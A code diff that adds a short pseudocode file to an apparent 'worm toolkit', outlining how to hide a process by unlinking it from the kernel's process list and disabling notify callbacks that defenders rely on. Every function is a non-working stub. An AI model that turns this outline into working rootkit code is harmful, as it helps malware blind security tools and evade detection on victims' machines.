@@ -1,0 +1,25 @@
+# +--------------------------------------------------------------------------+
+# |                                                                          |
+# |                       Veneficus Mini Worm Toolkit                        |
+# |                                                                          |
+# +--------------------------------------------------------------------------+
+
+# src/stealth/kernel_hide.pseudo
+# Direct kernel-object hide. Requires a kernel write primitive.
+
+FUNCTION hide(pid) -> bool:
+    TRY unlink_from_active_process_list(pid) THEN RETURN true
+    TRY alternate_enumeration_hole(pid)      THEN RETURN true
+    TRY drop_create_notify_callbacks() AND unlink_from_active_process_list(pid)
+    RETURN false
+
+FUNCTION unlink_from_active_process_list(pid) -> bool:
+    # Would patch the doubly-linked process list in kernel memory.
+    RETURN false     # no write primitive confirmed
+
+FUNCTION alternate_enumeration_hole(pid) -> bool:
+    RETURN false
+
+FUNCTION drop_create_notify_callbacks() -> bool:
+    # Would null notify-routine slots belonging to defenders.
+    RETURN false
